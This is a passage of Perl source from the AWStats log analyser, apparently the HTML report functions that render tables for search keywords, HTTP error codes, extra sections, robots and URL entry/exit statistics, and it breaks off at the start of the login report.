HTMLShowKeywords{\n\tmy $NewLinkTarget = shift;\n\tprint \"$Center<a name=\\\"keywords\\\">&nbsp;</a><br />\\n\";\n\tmy $title = \"$Message[44]\";\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link \n           $title = \"$title &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=KEYWORDS&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    } \n\t&tab_head( $title, 19, 0, 'keywords' );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"\"\n\t  . Tooltip(15)\n\t  . \"><th>\".Format_Number($TotalDifferentKeywords).\" $Message[13]</th><th bgcolor=\\\"#$color_s\\\" width=\\\"80\\\">$Message[14]</th><th bgcolor=\\\"#$color_s\\\" width=\\\"80\\\">$Message[15]</th></tr>\\n\";\n\tmy $total_s = 0;\n\tmy $count = 0;\n\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Keyword'},\n\t\t\\%_keywords, \\%_keywords );\n\tforeach my $key (@keylist) {\n\t\tmy $mot;\n  \t\t# Convert coded keywords (utf8,...) to be correctly reported in HTML page.\n\t\tif ( $PluginsLoaded{'DecodeKey'}{'decodeutfkeys'} ) {\n\t\t\t$mot = CleanXSS(\n\t\t\t\tDecodeKey_decodeutfkeys(\n\t\t\t\t\t$key, $PageCode || 'iso-8859-1'\n\t\t\t\t)\n\t\t\t);\n\t\t}\n\t\telse { $mot = CleanXSS( DecodeEncodedString($key) ); }\n\t\tmy $p;\n\t\tif ($TotalKeywords) {\n\t\t\t$p = int( $_keywords{$key} / $TotalKeywords * 1000 ) / 10;\n\t\t}\n\t\tprint \"<tr><td class=\\\"aws\\\">\"\n\t\t  . XMLEncode($mot)\n\t\t  . \"</td><td>$_keywords{$key}</td><td>$p %</td></tr>\\n\";\n\t\t$total_s += $_keywords{$key};\n\t\t$count++;\n\t}\n\tif ($Debug) {\n\t\tdebug( \"Total real / shown : $TotalKeywords / $total_s\", 2 );\n\t}\n\tmy $rest_s = $TotalKeywords - $total_s;\n\tif ( $rest_s > 0 ) {\n\t\tmy $p;\n\t\tif ($TotalKeywords) {\n\t\t\t$p = int( $rest_s / $TotalKeywords * 1000 ) / 10;\n\t\t}\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[30]</span></td><td>\".Format_Number($rest_s).\"</td>\";\n\t\tprint \"<td>$p %</td></tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the HTTP Error code frame or static page\n# Parameters:   $code - the error code we're printing\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowErrorCodes{\n\tmy $code = shift;\n\tmy $title;\n\tmy %customtitles = ( \"404\", \"$Message[47]\" );\n\t$title = $customtitles{$code} ? $customtitles{$code} :\n\t           (join(' ', ( ($httpcodelib{$code} ? $httpcodelib{$code} :\n\t           'Unknown error'), \"urls (HTTP code \" . $code . \")\" )));\n\tprint \"$Center<a name=\\\"errors$code\\\">&nbsp;</a><br />\\n\";\n\t&tab_head( $title, 19, 0, \"errors$code\" );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>URL (\"\n\t  . Format_Number(( scalar keys %{$_sider_h{$code}} ))\n\t  . \")</th><th bgcolor=\\\"#$color_h\\\">$Message[49]</th>\";\n\tforeach (split(//, $ShowHTTPErrorsPageDetail)) {\n\t\tif ( $_ =~ /R/i ) {\n\t\t\tprint \"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[23]</th>\";\n\t\t} elsif ( $_ =~ /H/i ) {\n\t\t\tprint \"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[81]</th>\";\n\t\t}\n\t}\n\tprint \"</tr>\\n\";\n\tmy $total_h = 0;\n\tmy $count = 0;\n\t&BuildKeyList( $MaxRowsInHTMLOutput, 1, \\%{$_sider_h{$code}},\n\t\t\\%{$_sider_h{$code}} );\n\tforeach my $key (@keylist) {\n\t\tmy $nompage = XMLEncode( CleanXSS($key) );\n\n\t\t#if (length($nompage)>$MaxLengthOfShownURL) { $nompage=substr($nompage,0,$MaxLengthOfShownURL).\"...\"; }\n\t\tmy $referer = XMLEncode( CleanXSS( $_referer_h{$code}{$key} ) );\n\t\tmy $host = XMLEncode( CleanXSS( $_err_host_h{$code}{$key} ) );\n\t\tprint \"<tr><td class=\\\"aws\\\">$nompage</td>\";\n\t\tprint \"<td>\".Format_Number($_sider_h{$code}{$key}).\"</td>\";\n\t\tforeach (split(//, $ShowHTTPErrorsPageDetail)) {\n\t\t\tif ( $_ =~ /R/i ) {\n\t\t\t\tprint \"<td class=\\\"aws\\\">\" . ( $referer ? \"$referer\" : \"&nbsp;\" ) . \"</td>\";\n\t\t\t} elsif ( $_ =~ /H/i ) {\n\t\t\t\tprint \"<td class=\\\"aws\\\">\" . ( $host ? \"$host\" : \"&nbsp;\" ) . \"</td>\";\n\t\t\t}\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\tmy $total_s += $_sider_h{$code}{$key};\n\t\t$count++;\n\t}\n\n# TODO Build TotalErrorHits\n#\t\t\tif ($Debug) { debug(\"Total real / shown : $TotalErrorHits / $total_h\",2); }\n#\t\t\t$rest_h=$TotalErrorHits-$total_h;\n#\t\t\tif ($rest_h > 0) {\n#\t\t\t\tmy $p;\n#\t\t\t\tif ($TotalErrorHits) { $p=int($rest_h/$TotalErrorHits*1000)/10; }\n#\t\t\t\tprint \"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[30]</span></td>\";\n#\t\t\t\tprint \"<td>$rest_h</td>\";\n#\t\t\t\tprint \"<td>...</td>\";\n#\t\t\t\tprint \"</tr>\\n\";\n#\t\t\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Loops through any defined extra sections and dumps the info to HTML\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowExtraSections{\n\tforeach my $extranum ( 1 .. @ExtraName - 1 ) {\n\t\tmy $total_p = 0;\n\t\tmy $total_h = 0;\n\t\tmy $total_k = 0;\n\t\t\n\t\tif ( $HTMLOutput{\"allextra$extranum\"} ) {\n\t\t\tif ($Debug) { debug( \"ExtraName$extranum\", 2 ); }\n\t\t\tprint \"$Center<a name=\\\"extra$extranum\\\">&nbsp;</a><br />\";\n\t\t\tmy $title = $ExtraName[$extranum];\n\t\t\t&tab_head( \"$title\", 19, 0, \"extra$extranum\" );\n\t\t\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\">\";\n\t\t\tprint \"<th>\" . $ExtraFirstColumnTitle[$extranum] . \"</th>\";\n\n\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/P/i ) {\n\t\t\t\tprint\n\"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th>\";\n\t\t\t}\n\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/H/i ) {\n\t\t\t\tprint\n\"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th>\";\n\t\t\t}\n\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/B/i ) {\n\t\t\t\tprint\n\"<th class=\\\"datasize\\\" bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th>\";\n\t\t\t}\n\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/L/i ) {\n\t\t\t\tprint \"<th width=\\\"120\\\">$Message[9]</th>\";\n\t\t\t}\n\t\t\tprint \"</tr>\\n\";\n\t\t\t$total_p = $total_h = $total_k = 0;\n\n #$max_h=1; foreach (values %_login_h) { if ($_ > $max_h) { $max_h = $_; } }\n #$max_k=1; foreach (values %_login_k) { if ($_ > $max_k) { $max_k = $_; } }\n\t\t\tmy $count = 0;\n\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/P/i ) {\n\t\t\t\t&BuildKeyList(\n\t\t\t\t\t$MaxRowsInHTMLOutput,\n\t\t\t\t\t$MinHitExtra[$extranum],\n\t\t\t\t\t\\%{ '_section_' . $extranum . '_h' },\n\t\t\t\t\t\\%{ '_section_' . $extranum . '_p' }\n\t\t\t\t);\n\t\t\t}\n\t\t\telse {\n\t\t\t\t&BuildKeyList(\n\t\t\t\t\t$MaxRowsInHTMLOutput,\n\t\t\t\t\t$MinHitExtra[$extranum],\n\t\t\t\t\t\\%{ '_section_' . $extranum . '_h' },\n\t\t\t\t\t\\%{ '_section_' . $extranum . '_h' }\n\t\t\t\t);\n\t\t\t}\n\t\t\tmy %keysinkeylist = ();\n\t\t\tforeach my $key (@keylist) {\n\t\t\t\t$keysinkeylist{$key} = 1;\n\t\t\t\tmy $firstcol = CleanXSS( DecodeEncodedString($key) );\n\t\t\t\t$total_p += ${ '_section_' . $extranum . '_p' }{$key};\n\t\t\t\t$total_h += ${ '_section_' . $extranum . '_h' }{$key};\n\t\t\t\t$total_k += ${ '_section_' . $extranum . '_k' }{$key};\n\t\t\t\tprint \"<tr>\";\n\t\t\t\tprintf(\n\"<td class=\\\"aws\\\">$ExtraFirstColumnFormat[$extranum]</td>\",\n\t\t\t\t\t$firstcol, $firstcol, $firstcol, $firstcol, $firstcol );\n\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/P/i ) {\n\t\t\t\t\tprint \"<td>\"\n\t\t\t\t\t  . ${ '_section_' . $extranum . '_p' }{$key} . \"</td>\";\n\t\t\t\t}\n\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/H/i ) {\n\t\t\t\t\tprint \"<td>\"\n\t\t\t\t\t  . ${ '_section_' . $extranum . '_h' }{$key} . \"</td>\";\n\t\t\t\t}\n\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/B/i ) {\n\t\t\t\t\tprint \"<td>\"\n\t\t\t\t\t  . Format_Bytes(\n\t\t\t\t\t\t${ '_section_' . $extranum . '_k' }{$key} )\n\t\t\t\t\t  . \"</td>\";\n\t\t\t\t}\n\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/L/i ) {\n\t\t\t\t\tprint \"<td>\"\n\t\t\t\t\t  . (\n\t\t\t\t\t\t${ '_section_' . $extranum . '_l' }{$key}\n\t\t\t\t\t\t? Format_Date(\n\t\t\t\t\t\t\t${ '_section_' . $extranum . '_l' }{$key}, 1 )\n\t\t\t\t\t\t: '-'\n\t\t\t\t\t  )\n\t\t\t\t\t  . \"</td>\";\n\t\t\t\t}\n\t\t\t\tprint \"</tr>\\n\";\n\t\t\t\t$count++;\n\t\t\t}\n\n\t\t\t# If we ask average or sum, we loop on all other records\n\t\t\tif (   $ExtraAddAverageRow[$extranum]\n\t\t\t\t|| $ExtraAddSumRow[$extranum] )\n\t\t\t{\n\t\t\t\tforeach ( keys %{ '_section_' . $extranum . '_h' } ) {\n\t\t\t\t\tif ( $keysinkeylist{$_} ) { next; }\n\t\t\t\t\t$total_p += ${ '_section_' . $extranum . '_p' }{$_};\n\t\t\t\t\t$total_h += ${ '_section_' . $extranum . '_h' }{$_};\n\t\t\t\t\t$total_k += ${ '_section_' . $extranum . '_k' }{$_};\n\t\t\t\t\t$count++;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t# Add average row\n\t\t\tif ( $ExtraAddAverageRow[$extranum] ) {\n\t\t\t\tprint \"<tr>\";\n\t\t\t\tprint \"<td class=\\\"aws\\\"><b>$Message[96]</b></td>\";\n\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/P/i ) {\n\t\t\t\t\tprint \"<td>\"\n\t\t\t\t\t  . ( $count ? Format_Number(( $total_p / $count )) : \"&nbsp;\" )\n\t\t\t\t\t  . \"</td>\";\n\t\t\t\t}\n\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/H/i ) {\n\t\t\t\t\tprint \"<td>\"\n\t\t\t\t\t  . ( $count ? Format_Number(( $total_h / $count )) : \"&nbsp;\" )\n\t\t\t\t\t  . \"</td>\";\n\t\t\t\t}\n\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/B/i ) {\n\t\t\t\t\tprint \"<td>\"\n\t\t\t\t\t  . (\n\t\t\t\t\t\t$count\n\t\t\t\t\t\t? Format_Bytes( $total_k / $count )\n\t\t\t\t\t\t: \"&nbsp;\"\n\t\t\t\t\t  )\n\t\t\t\t\t  . \"</td>\";\n\t\t\t\t}\n\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/L/i ) {\n\t\t\t\t\tprint \"<td>&nbsp;</td>\";\n\t\t\t\t}\n\t\t\t\tprint \"</tr>\\n\";\n\t\t\t}\n\n\t\t\t# Add sum row\n\t\t\tif ( $ExtraAddSumRow[$extranum] ) {\n\t\t\t\tprint \"<tr>\";\n\t\t\t\tprint \"<td class=\\\"aws\\\"><b>$Message[102]</b></td>\";\n\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/P/i ) {\n\t\t\t\t\tprint \"<td>\" . ($total_p) . \"</td>\";\n\t\t\t\t}\n\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/H/i ) {\n\t\t\t\t\tprint \"<td>\" . ($total_h) . \"</td>\";\n\t\t\t\t}\n\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/B/i ) {\n\t\t\t\t\tprint \"<td>\" . Format_Bytes($total_k) . \"</td>\";\n\t\t\t\t}\n\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ m/L/i ) {\n\t\t\t\t\tprint \"<td>&nbsp;</td>\";\n\t\t\t\t}\n\t\t\t\tprint \"</tr>\\n\";\n\t\t\t}\n\t\t\t&tab_end();\n\t\t\t&html_end(1);\n\t\t}\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Robot details frame or static page\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowRobots{\n\tmy $total_p = 0;\n\tmy $total_h = 0;\n\tmy $total_k = 0;\n\tmy $total_r = 0;\n\tmy $rest_p = 0;\n\tmy $rest_h = 0;\n\tmy $rest_k = 0;\n\tmy $rest_r = 0;\n\t\n\tprint \"$Center<a name=\\\"robots\\\">&nbsp;</a><br />\\n\";\n\tmy $title = '';\n\tif ( $HTMLOutput{'allrobots'} )  { $title .= \"$Message[53]\"; }\n\tif ( $HTMLOutput{'lastrobots'} ) { $title .= \"$Message[9]\"; }\n\t&tab_head( \"$title\", 19, 0, 'robots' );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>\"\n\t  . Format_Number(( scalar keys %_robot_h ))\n\t  . \" $Message[51]</th>\";\n\tif ( $ShowRobotsStats =~ /H/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th>\";\n\t}\n\tif ( $ShowRobotsStats =~ /B/i ) {\n\t\tprint\n\"<th class=\\\"datasize\\\" bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th>\";\n\t}\n\tif ( $ShowRobotsStats =~ /L/i ) {\n\t\tprint \"<th width=\\\"120\\\">$Message[9]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\t$total_p = $total_h = $total_k = $total_r = 0;\n\tmy $count = 0;\n\tif ( $HTMLOutput{'allrobots'} ) {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Robot'},\n\t\t\t\\%_robot_h, \\%_robot_h );\n\t}\n\tif ( $HTMLOutput{'lastrobots'} ) {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Robot'},\n\t\t\t\\%_robot_h, \\%_robot_l );\n\t}\n\tforeach my $key (@keylist) {\n\t\tprint \"<tr><td class=\\\"aws\\\">\"\n\t\t  . ( $RobotsHashIDLib{$key} ? $RobotsHashIDLib{$key} : $key )\n\t\t  . \"</td>\";\n\t\tif ( $ShowRobotsStats =~ /H/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . Format_Number(( $_robot_h{$key} - $_robot_r{$key} ))\n\t\t\t  . ( $_robot_r{$key} ? \"+$_robot_r{$key}\" : \"\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowRobotsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes( $_robot_k{$key} ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowRobotsStats =~ /L/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$_robot_l{$key}\n\t\t\t\t? Format_Date( $_robot_l{$key}, 1 )\n\t\t\t\t: '-'\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\n\t\t#$total_p += $_robot_p{$key}||0;\n\t\t$total_h += $_robot_h{$key};\n\t\t$total_k += $_robot_k{$key} || 0;\n\t\t$total_r += $_robot_r{$key} || 0;\n\t\t$count++;\n\t}\n\n\t# For bots we need to count Totals\n\tmy $TotalPagesRobots =\n\t  0;    #foreach (values %_robot_p) { $TotalPagesRobots+=$_; }\n\tmy $TotalHitsRobots = 0;\n\tforeach ( values %_robot_h ) { $TotalHitsRobots += $_; }\n\tmy $TotalBytesRobots = 0;\n\tforeach ( values %_robot_k ) { $TotalBytesRobots += $_; }\n\tmy $TotalRRobots = 0;\n\tforeach ( values %_robot_r ) { $TotalRRobots += $_; }\n\t$rest_p = 0;    #$rest_p=$TotalPagesRobots-$total_p;\n\t$rest_h = $TotalHitsRobots - $total_h;\n\t$rest_k = $TotalBytesRobots - $total_k;\n\t$rest_r = $TotalRRobots - $total_r;\n\n\tif ($Debug) {\n\t\tdebug(\n\"Total real / shown : $TotalPagesRobots / $total_p - $TotalHitsRobots / $total_h - $TotalBytesRobots / $total_k\",\n\t\t\t2\n\t\t);\n\t}\n\tif ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 || $rest_r > 0 )\n\t{               # All other robots\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tif ( $ShowRobotsStats =~ /H/i ) { print \"<td>\".Format_Number($rest_h).\"</td>\"; }\n\t\tif ( $ShowRobotsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . ( Format_Bytes($rest_k) ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowRobotsStats =~ /L/i ) { print \"<td>&nbsp;</td>\"; }\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end(\n\t\t\"* $Message[156]\" . ( $TotalRRobots ? \" $Message[157]\" : \"\" ) );\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the URL, Entry or Exit details frame or static page\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowURLDetail{\n\tmy $total_p = 0;\n\tmy $total_e = 0;\n\tmy $total_k = 0;\n\tmy $total_x = 0;\n\t# Call to plugins' function ShowPagesFilter\n\tforeach\n\t  my $pluginname ( keys %{ $PluginsLoaded{'ShowPagesFilter'} } )\n\t{\n\t\tmy $function = \"ShowPagesFilter_$pluginname\";\n\t\t&$function();\n\t}\n\tprint \"$Center<a name=\\\"urls\\\">&nbsp;</a><br />\\n\";\n\n\t# Show filter form\n\t&HTMLShowFormFilter( \"urlfilter\", $FilterIn{'url'}, $FilterEx{'url'} );\n\n\t# Show URL list\n\tmy $title = '';\n\tmy $cpt   = 0;\n\tif ( $HTMLOutput{'urldetail'} ) {\n\t\t$title = $Message[19];\n\t\t$cpt   = ( scalar keys %_url_p );\n\t}\n\tif ( $HTMLOutput{'urlentry'} ) {\n\t\t$title = $Message[104];\n\t\t$cpt   = ( scalar keys %_url_e );\n\t}\n\tif ( $HTMLOutput{'urlexit'} ) {\n\t\t$title = $Message[116];\n\t\t$cpt   = ( scalar keys %_url_x );\n\t}\n\t&tab_head( \"$title\", 19, 0, 'urls' );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>\";\n\tif ( $FilterIn{'url'} || $FilterEx{'url'} ) {\n\t\tif ( $FilterIn{'url'} ) {\n\t\t\tprint \"$Message[79] <b>$FilterIn{'url'}</b>\";\n\t\t}\n\t\tif ( $FilterIn{'url'} && $FilterEx{'url'} ) { print \" - \"; }\n\t\tif ( $FilterEx{'url'} ) {\n\t\t\tprint \"Exclude $Message[79] <b>$FilterEx{'url'}</b>\";\n\t\t}\n\t\tif ( $FilterIn{'url'} || $FilterEx{'url'} ) { print \": \"; }\n\t\tprint Format_Number($cpt).\" $Message[28]\";\n\t\tif ( $MonthRequired ne 'all' ) {\n\t\t\tif ( $HTMLOutput{'urldetail'} ) {\n\t\t\t\tprint\n\"<br />$Message[102]: \".Format_Number($TotalDifferentPages).\" $Message[28]\";\n\t\t\t}\n\t\t}\n\t}\n\telse { print \"$Message[102]: \".Format_Number($cpt).\" $Message[28]\"; }\n\tprint \"</th>\";\n\tif ( $ShowPagesStats =~ /P/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[29]</th>\";\n\t}\n\tif ( $ShowPagesStats =~ /B/i ) {\n\t\tprint\n\"<th class=\\\"datasize\\\" bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[106]</th>\";\n\t}\n\tif ( $ShowPagesStats =~ /E/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_e\\\" width=\\\"80\\\">$Message[104]</th>\";\n\t}\n\tif ( $ShowPagesStats =~ /X/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_x\\\" width=\\\"80\\\">$Message[116]</th>\";\n\t}\n\n\t# Call to plugins' function ShowPagesAddField\n\tforeach\n\t  my $pluginname ( keys %{ $PluginsLoaded{'ShowPagesAddField'} } )\n\t{\n\n\t\t#    \t\t\tmy $function=\"ShowPagesAddField_$pluginname('title')\";\n\t\t#    \t\t\teval(\"$function\");\n\t\tmy $function = \"ShowPagesAddField_$pluginname\";\n\t\t&$function('title');\n\t}\n\tprint \"<th>&nbsp;</th></tr>\\n\";\n\t$total_p = $total_k = $total_e = $total_x = 0;\n\tmy $count = 0;\n\tif ( $HTMLOutput{'urlentry'} ) {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'File'}, \\%_url_e,\n\t\t\t\\%_url_e );\n\t}\n\telsif ( $HTMLOutput{'urlexit'} ) {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'File'}, \\%_url_x,\n\t\t\t\\%_url_x );\n\t}\n\telse {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'File'}, \\%_url_p,\n\t\t\t\\%_url_p );\n\t}\n\tmy $max_p = 1;\n\tmy $max_k = 1;\n\tforeach my $key (@keylist) {\n\t\tif ( $_url_p{$key} > $max_p ) { $max_p = $_url_p{$key}; }\n\t\tif ( $_url_k{$key} / ( $_url_p{$key} || 1 ) > $max_k ) {\n\t\t\t$max_k = $_url_k{$key} / ( $_url_p{$key} || 1 );\n\t\t}\n\t}\n\tforeach my $key (@keylist) {\n\t\tprint \"<tr><td class=\\\"aws\\\">\";\n\t\t&HTMLShowURLInfo($key);\n\t\tprint \"</td>\";\n\t\tmy $bredde_p = 0;\n\t\tmy $bredde_e = 0;\n\t\tmy $bredde_x = 0;\n\t\tmy $bredde_k = 0;\n\t\tif ( $max_p > 0 ) {\n\t\t\t$bredde_p =\n\t\t\t  int( $BarWidth * ( $_url_p{$key} || 0 ) / $max_p ) + 1;\n\t\t}\n\t\tif ( ( $bredde_p == 1 ) && $_url_p{$key} ) { $bredde_p = 2; }\n\t\tif ( $max_p > 0 ) {\n\t\t\t$bredde_e =\n\t\t\t  int( $BarWidth * ( $_url_e{$key} || 0 ) / $max_p ) + 1;\n\t\t}\n\t\tif ( ( $bredde_e == 1 ) && $_url_e{$key} ) { $bredde_e = 2; }\n\t\tif ( $max_p > 0 ) {\n\t\t\t$bredde_x =\n\t\t\t  int( $BarWidth * ( $_url_x{$key} || 0 ) / $max_p ) + 1;\n\t\t}\n\t\tif ( ( $bredde_x == 1 ) && $_url_x{$key} ) { $bredde_x = 2; }\n\t\tif ( $max_k > 0 ) {\n\t\t\t$bredde_k =\n\t\t\t  int( $BarWidth *\n\t\t\t\t  ( ( $_url_k{$key} || 0 ) / ( $_url_p{$key} || 1 ) ) /\n\t\t\t\t  $max_k ) + 1;\n\t\t}\n\t\tif ( ( $bredde_k == 1 ) && $_url_k{$key} ) { $bredde_k = 2; }\n\t\tif ( $ShowPagesStats =~ /P/i ) {\n\t\t\tprint \"<td>\".Format_Number($_url_p{$key}).\"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /B/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$_url_k{$key}\n\t\t\t\t? Format_Bytes(\n\t\t\t\t\t$_url_k{$key} / ( $_url_p{$key} || 1 )\n\t\t\t\t  )\n\t\t\t\t: \"&nbsp;\"\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /E/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $_url_e{$key} ? Format_Number($_url_e{$key}) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /X/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $_url_x{$key} ? Format_Number($_url_x{$key}) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\n\t\t# Call to plugins' function ShowPagesAddField\n\t\tforeach my $pluginname (\n\t\t\tkeys %{ $PluginsLoaded{'ShowPagesAddField'} } )\n\t\t{\n\n\t\t  #    \t\t\t\tmy $function=\"ShowPagesAddField_$pluginname('$key')\";\n\t\t  #    \t\t\t\teval(\"$function\");\n\t\t\tmy $function = \"ShowPagesAddField_$pluginname\";\n\t\t\t&$function($key);\n\t\t}\n\t\tprint \"<td class=\\\"aws\\\">\";\n\n\t\t# alt and title are not provided to reduce page size\n\t\tif ( $ShowPagesStats =~ /P/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hp'}\\\" width=\\\"$bredde_p\\\" height=\\\"4\\\" /><br />\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /B/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hk'}\\\" width=\\\"$bredde_k\\\" height=\\\"4\\\" /><br />\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /E/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'he'}\\\" width=\\\"$bredde_e\\\" height=\\\"4\\\" /><br />\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /X/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hx'}\\\" width=\\\"$bredde_x\\\" height=\\\"4\\\" />\";\n\t\t}\n\t\tprint \"</td></tr>\\n\";\n\t\t$total_p += $_url_p{$key};\n\t\t$total_e += $_url_e{$key};\n\t\t$total_x += $_url_x{$key};\n\t\t$total_k += $_url_k{$key};\n\t\t$count++;\n\t}\n\tif ($Debug) {\n\t\tdebug(\n\"Total real / shown : $TotalPages / $total_p - $TotalEntries / $total_e - $TotalExits / $total_x - $TotalBytesPages / $total_k\",\n\t\t\t2\n\t\t);\n\t}\n\tmy $rest_p = $TotalPages - $total_p;\n\tmy $rest_k = $TotalBytesPages - $total_k;\n\tmy $rest_e = $TotalEntries - $total_e;\n\tmy $rest_x = $TotalExits - $total_x;\n\tif ( $rest_p > 0 || $rest_e > 0 || $rest_k > 0 ) {\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tif ( $ShowPagesStats =~ /P/i ) {\n\t\t\tprint \"<td>\" . ( $rest_p ? Format_Number($rest_p) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /B/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$rest_k\n\t\t\t\t? Format_Bytes( $rest_k / ( $rest_p || 1 ) )\n\t\t\t\t: \"&nbsp;\"\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /E/i ) {\n\t\t\tprint \"<td>\" . ( $rest_e ? Format_Number($rest_e) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /X/i ) {\n\t\t\tprint \"<td>\" . ( $rest_x ? Format_Number($rest_x) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\n\t\t# Call to plugins' function ShowPagesAddField\n\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowPagesAddField'} } )\n\t\t{\n\t\t\tmy $function = \"ShowPagesAddField_$pluginname\";\n\t\t\t&$function('');\n\t\t}\n\t\tprint \"<td>&nbsp;</td></tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Login details frame or static page\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowLogins{\n\tmy $total_p = 0;\n\tmy $total_h = 0;\n\tmy $total_k = 0;\n\tmy $rest_p 